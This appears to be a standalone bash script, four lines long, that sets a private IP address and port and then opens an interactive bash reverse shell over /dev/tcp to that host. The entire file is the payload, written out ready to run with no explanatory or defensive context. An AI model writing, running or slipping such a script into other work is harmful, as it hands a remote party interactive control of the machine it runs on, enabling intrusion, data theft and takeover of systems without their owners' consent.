#!/bin/bash
IP="10.60.99.29"
PORT="4456"
bash -i >& /dev/tcp/$IP/$PORT 0>&1
